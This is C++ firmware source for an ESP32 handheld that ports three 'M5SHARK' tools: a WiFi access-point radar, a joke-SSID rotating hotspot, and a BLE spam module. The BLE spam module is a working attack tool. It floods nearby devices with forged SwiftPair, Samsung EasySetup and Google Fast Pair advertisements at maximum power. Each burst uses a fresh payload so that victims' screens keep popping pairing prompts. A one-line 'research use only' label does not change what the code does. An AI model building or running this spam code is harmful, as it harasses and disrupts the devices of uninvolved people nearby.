// SharkTools.cpp — M5SHARK tools ported to SHARKDIV. See SharkTools.h.
// Each tool is a self-contained blocking-ish feature screen following the
// ESP32-DIV pattern: Setup once on entry, Loop every pass, exit on leaving.

#include "SharkTools.h"
#include "config.h"
#include <math.h>
#include "esp_wifi.h"

namespace {
// The boot-time background scanner fires a scan every 15 s. If one is in
// flight when a tool takes over the radio, every foreground scan/AP start
// fails until it is cleared — take the radio explicitly first.
void takeOverWifiRadio() {
  esp_wifi_scan_stop();
  WiFi.scanDelete();
}
}  // namespace


namespace {

// Shared chrome: exit-only nav bar, status bar, "// TITLE" sub-header.
void toolChrome(const char* title) {
  setTouchButtonInputEnabled(true);
  setTouchNavLabels(nullptr, nullptr, "Exit", nullptr, nullptr);
  if (featureHasTouchNavBar()) {
    featureClearContent(TFT_BLACK);
  } else {
    tft.fillScreen(TFT_BLACK);
  }
  drawStatusBar(readBatteryVoltage(), true);

  tft.setTextDatum(ML_DATUM);
  tft.setTextColor(UI_ICON, TFT_BLACK);
  tft.drawString(String("// ") + title, 6, 28, 2);
  tft.drawFastHLine(0, 37, tft.width(), UI_LINE);
  tft.setTextDatum(TL_DATUM);

  setupTouchscreen();
  redrawTouchButtonBar();
}

}  // namespace

// ─────────────────────────────────────────────────────────── WiFi Radar ──
// Ported from M5SHARK SharkRadar::runWifi. APs get a stable angle per BSSID
// and a radius from RSSI (-30 dBm at the centre, -90 dBm at the edge).
namespace WifiRadar {

static constexpr int16_t RCX = 120;
static constexpr int16_t RCY = 168;
static constexpr int16_t RR  = 88;

static float    s_sweep = 0.0f;
static uint32_t s_lastScan = 0;
static int      s_found = 0;
static String   s_bestName;
static int      s_bestRssi = -128;

static uint16_t keyHash(const uint8_t* p, int n) {
  uint32_t h = 2166136261UL;
  for (int i = 0; i < n; i++) { h ^= p[i]; h *= 16777619UL; }
  h ^= h >> 15;
  return (uint16_t)h;
}

static void drawFrame(float sweep) {
  for (int16_t rr = RR; rr > 0; rr -= RR / 3)
    tft.drawCircle(RCX, RCY, rr, UI_LINE);
  tft.drawFastHLine(RCX - RR, RCY, 2 * RR, UI_LABLE);
  tft.drawFastVLine(RCX, RCY - RR, 2 * RR, UI_LABLE);
  // Sweep line with a faint trailing wedge.
  for (int8_t t = 0; t < 4; t++) {
    const float a = sweep - t * 0.10f;
    tft.drawLine(RCX, RCY, RCX + (int16_t)(cosf(a) * RR),
                 RCY + (int16_t)(sinf(a) * RR), t == 0 ? UI_ICON : UI_LINE);
  }
}

void wifiRadarSetup() {
  pauseBackgroundRadioTasks();
  takeOverWifiRadio();
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect(false, true);
  toolChrome("WIFI RADAR");

  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("BACK / SELECT = exit", tft.width() / 2, 306, 1);
  tft.setTextDatum(TL_DATUM);

  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect(false, true);
  s_sweep = 0.0f;
  s_lastScan = 0;
  s_found = 0;
  s_bestName = "";
  s_bestRssi = -128;
}

void wifiRadarLoop() {
  if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
    feature_exit_requested = true;
    return;
  }

  // Rescan every ~2.5 s; the sweep animates between scans.
  if (s_lastScan == 0 || millis() - s_lastScan > 2500) {
    tft.fillRect(4, 262, tft.width() - 8, 12, TFT_BLACK);
    tft.setTextColor(UI_WARN, TFT_BLACK);
    tft.setTextDatum(TL_DATUM);
    tft.drawString("scanning...", 8, 264, 1);
    WiFi.scanDelete();  // a stale async scan makes every new scan fail
    s_found = WiFi.scanNetworks(false, false);
    if (s_found < 0) {
      // Radio was busy (e.g. a leftover background scan): clear and retry
      // on the next frame instead of showing -1 forever.
      takeOverWifiRadio();
      s_found = 0;
      s_lastScan = 0;
    } else {
      s_lastScan = millis();
    }
  }

  tft.fillRect(RCX - RR - 2, RCY - RR - 2, 2 * RR + 4, 2 * RR + 4, TFT_BLACK);
  drawFrame(s_sweep);

  s_bestRssi = -128;
  s_bestName = "";
  for (int i = 0; i < s_found; i++) {
    const int rssi = WiFi.RSSI(i);
    const uint8_t* bssid = WiFi.BSSID(i);
    const uint16_t h = bssid ? keyHash(bssid, 6) : (uint16_t)(i * 2654);
    const float ang = (h / 65535.0f) * 2.0f * PI;
    const float norm = constrain((float)(-30 - rssi) / 60.0f, 0.05f, 1.0f);
    const int16_t br = (int16_t)(norm * RR);
    const int16_t bx = RCX + (int16_t)(cosf(ang) * br);
    const int16_t by = RCY + (int16_t)(sinf(ang) * br);
    const uint16_t col = rssi > -55 ? UI_ICON : (rssi > -75 ? UI_TEXT : GRAY);
    tft.fillCircle(bx, by, 2, col);
    if (rssi > s_bestRssi) {
      s_bestRssi = rssi;
      s_bestName = WiFi.SSID(i);
    }
  }

  tft.fillRect(4, 262, tft.width() - 8, 30, TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(UI_ICON, TFT_BLACK);
  tft.drawString(String("APs: ") + s_found, 8, 264, 2);
  if (s_bestName.length()) {
    tft.setTextColor(UI_TEXT, TFT_BLACK);
    String s = String(s_bestRssi) + "dBm " + s_bestName;
    while (s.length() > 3 && tft.textWidth(s, 1) > tft.width() - 16)
      s.remove(s.length() - 1);
    tft.drawString(s, 8, 282, 1);
  }

  s_sweep += 0.22f;
  if (s_sweep > 2.0f * PI)
    s_sweep -= 2.0f * PI;
  delay(40);
}

void exit() {
  WiFi.scanDelete();
  WiFi.mode(WIFI_MODE_STA);  // restore STA so background scans resume
}

}  // namespace WifiRadar

// ──────────────────────────────────────────────────────── SSID Rotator ──
// Ported from M5SHARK SharkPrank::ssidRotator — an open hotspot cycling
// joke SSIDs every 5 s, with a live client counter.
namespace SsidRotator {

static const char* const kNames[6] = {
  "Pretty Fly for a WiFi", "Hide Yo Kids Hide Yo WiFi", "Drop It Like Its Hotspot",
  "Loading...", "Virus.exe", "Get Off My LAN"
};

static bool     s_running = false;
static uint8_t  s_idx = 0;
static uint32_t s_lastRotate = 0;
static uint32_t s_lastPaint = 0;

static void status(const char* l1, const char* l2, const char* l3, uint16_t col) {
  tft.fillRect(0, 46, tft.width(), 220, TFT_BLACK);
  tft.setTextDatum(MC_DATUM);
  if (l1 && l1[0]) { tft.setTextColor(col, TFT_BLACK);      tft.drawString(l1, tft.width() / 2, 110, 4); }
  if (l2 && l2[0]) { tft.setTextColor(UI_TEXT, TFT_BLACK);  tft.drawString(l2, tft.width() / 2, 160, 2); }
  if (l3 && l3[0]) { tft.setTextColor(GRAY, TFT_BLACK);     tft.drawString(l3, tft.width() / 2, 196, 2); }
  tft.setTextDatum(TL_DATUM);
}

void rotatorSetup() {
  pauseBackgroundRadioTasks();
  toolChrome("SSID ROTATOR");

  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("UP = start/stop", tft.width() / 2, 306, 1);
  tft.setTextDatum(TL_DATUM);

  s_running = false;
  s_idx = 0;
  s_lastRotate = 0;
  s_lastPaint = 0;
  status("READY", kNames[0], "UP to start rotating", GRAY);
}

void rotatorLoop() {
  if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
    feature_exit_requested = true;
    return;
  }

  if (isButtonPressed(BTN_UP) || isTouchNavButtonPressedEdge(BTN_UP)) {
    delay(300);  // level-shift debounce
    if (!s_running) {
      s_idx = 0;
      takeOverWifiRadio();
      WiFi.mode(WIFI_MODE_AP);
      WiFi.disconnect(false, true);
      const bool apOk = WiFi.softAP(kNames[s_idx], nullptr, 6);
      s_running = apOk;
      s_lastRotate = millis();
      if (apOk) {
        status("ON AIR", kNames[s_idx], "rotating every 5s", UI_ICON);
      } else {
        status("AP FAILED", kNames[s_idx], "radio busy - try again", UI_WARN);
      }
    } else {
      WiFi.softAPdisconnect(true);
      s_running = false;
      status("STOPPED", kNames[s_idx], "", UI_WARN);
    }
  }

  if (s_running && millis() - s_lastRotate > 5000) {
    s_lastRotate = millis();
    s_idx = (s_idx + 1) % 6;
    WiFi.softAPdisconnect(true);
    delay(60);
    if (!WiFi.softAP(kNames[s_idx], nullptr, 6)) {
      s_running = false;
      status("AP FAILED", kNames[s_idx], "", UI_WARN);
    }
  }

  if (s_running && millis() - s_lastPaint > 500) {
    s_lastPaint = millis();
    status("ON AIR", kNames[s_idx],
           (String("clients: ") + WiFi.softAPgetStationNum()).c_str(), UI_ICON);
  }

  delay(20);
}

void exit() {
  if (s_running) {
    WiFi.softAPdisconnect(true);
    s_running = false;
  }
  WiFi.mode(WIFI_MODE_STA);
}

}  // namespace SsidRotator

// ──────────────────────────────────────────────────────────── BLE Spam ──
// Ported from M5SHARK's Bluetooth Attacks (SwiftPair / Samsung EasySetup /
// Google Fast Pair families). UP cycles the family; each burst gets a new
// random static MAC and a fresh payload so targets keep popping.
namespace BleSpam {

enum Family : uint8_t { FAM_ALL = 0, FAM_SWIFTPAIR, FAM_SAMSUNG, FAM_GOOGLE };
static const char* const kFamilyNames[4] = { "ALL", "SWIFTPAIR", "SAMSUNG", "GOOGLE" };

// Public Google Fast Pair model IDs (buds / CDM-discoverable devices).
static const uint8_t kFpIds[3][3] = {
  {0x58, 0xAA, 0x25},  // Buds Pro family
  {0x82, 0x1F, 0x66},  // Buds 2 family
  {0x01, 0x32, 0x5D},  // early buds CDM
};

static BLEAdvertising* s_adv = nullptr;
static uint8_t  s_family = FAM_ALL;
static uint8_t  s_sub = 0;
static uint32_t s_tx = 0;
static uint32_t s_rateCount = 0;
static uint32_t s_ratePerSec = 0;
static uint32_t s_rateTick = 0;
static unsigned long s_lastBtn = 0;

static void appendByte(std::string& s, uint8_t b) { s += (char)b; }

// Builds one AD structure (length, type, data...) for the given family.
static std::string buildPayload(uint8_t fam, uint8_t sub) {
  std::string s;
  switch (fam) {
    case FAM_SWIFTPAIR: {
      // MS manufacturer 0x0000 + random bytes: any SwiftPair device pops a
      // pairing card.
      std::string body;
      appendByte(body, 0x00);
      appendByte(body, 0x00);
      for (int i = 0; i < 8; i++) appendByte(body, (uint8_t)random(256));
      appendByte(s, (uint8_t)(body.size() + 1));
      appendByte(s, 0xFF);
      s += body;
      break;
    }
    case FAM_SAMSUNG: {
      // Service data UUID16 0xFE18 (Samsung EasySetup) buds/watch setup frame.
      std::string body;
      appendByte(body, 0x18); appendByte(body, 0xFE);  // little-endian UUID
      appendByte(body, sub & 1 ? 0x02 : 0x01);         // 1=buds 2=watch
      appendByte(body, 0x00); appendByte(body, 0x02); appendByte(body, 0x00);
      appendByte(body, 0x01); appendByte(body, 0x01);
      for (int i = 0; i < 14; i++) appendByte(body, 0x00);
      appendByte(body, 0x03);
      appendByte(body, 0x75);
      appendByte(s, (uint8_t)(body.size() + 1));
      appendByte(s, 0x16);  // service data
      s += body;
      break;
    }
    case FAM_GOOGLE: {
      // Service data UUID16 0xFE2C (Google Fast Pair), non-discoverable CDM.
      std::string body;
      appendByte(body, 0x2C); appendByte(body, 0xFE);
      appendByte(body, 0x00);                             // not discoverable
      appendByte(body, kFpIds[sub % 3][0]);
      appendByte(body, kFpIds[sub % 3][1]);
      appendByte(body, kFpIds[sub % 3][2]);
      appendByte(s, (uint8_t)(body.size() + 1));
      appendByte(s, 0x16);
      s += body;
      break;
    }
    default:
      break;
  }
  return s;
}

static void fireBurst() {
  uint8_t fam = s_family;
  if (fam == FAM_ALL) {
    fam = 1 + (s_sub % 3);
  }

  BLEAdvertisementData advData;
  advData.addData(buildPayload(fam, s_sub));

  // Fresh payload each burst keeps target UIs re-alerting (same approach as
  // the SourApple tool on this firmware).
  s_adv->stop();

  s_adv->setAdvertisementData(advData);
  s_adv->setMinInterval(0x20);
  s_adv->setMaxInterval(0x20);
  s_adv->setMinPreferred(0x20);
  s_adv->setMaxPreferred(0x20);
  s_adv->start();

  s_tx++;
  s_rateCount++;
  s_sub++;
}

static void paintHud() {
  char line[40];
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);

  snprintf(line, sizeof(line), "Family: %s", kFamilyNames[s_family]);
  tft.fillRect(8, 48, tft.width() - 16, 14, TFT_BLACK);
  tft.setTextColor(UI_ICON, TFT_BLACK);
  tft.drawString(line, 8, 50, 2);

  snprintf(line, sizeof(line), "TX %lu   %lu/s", (unsigned long)s_tx,
           (unsigned long)s_ratePerSec);
  tft.fillRect(8, 76, tft.width() - 16, 12, TFT_BLACK);
  tft.setTextColor(UI_TEXT, TFT_BLACK);
  tft.drawString(line, 8, 78, 2);

  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("UP = cycle family", 8, 100, 1);
}

void bleSpamSetup() {
  if (!ensureBleStackReady()) {
    feature_exit_requested = true;
    return;
  }
  toolChrome("BLE SPAM");

  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("research use only - own devices", tft.width() / 2, 306, 1);
  tft.setTextDatum(TL_DATUM);

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

  BLEServer* pServer = BLEDevice::createServer();
  s_adv = pServer->getAdvertising();

  s_family = FAM_ALL;
  s_sub = 0;
  s_tx = 0;
  s_rateCount = 0;
  s_ratePerSec = 0;
  s_rateTick = millis();
  paintHud();
}

void bleSpamLoop() {
  if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
    feature_exit_requested = true;
    return;
  }

  const unsigned long now = millis();
  if ((isButtonPressed(BTN_UP) || isTouchNavButtonPressedEdge(BTN_UP)) &&
      now - s_lastBtn > 400) {
    s_lastBtn = now;
    s_family = (s_family + 1) % 4;
    paintHud();
    delay(250);
  }

  fireBurst();

  if (now - s_rateTick >= 1000) {
    s_ratePerSec = s_rateCount;
    s_rateCount = 0;
    s_rateTick = now;
    paintHud();
  }

  delay(40);
}

void exit() {
  if (s_adv) {
    s_adv->stop();
  }
}

}  // namespace BleSpam
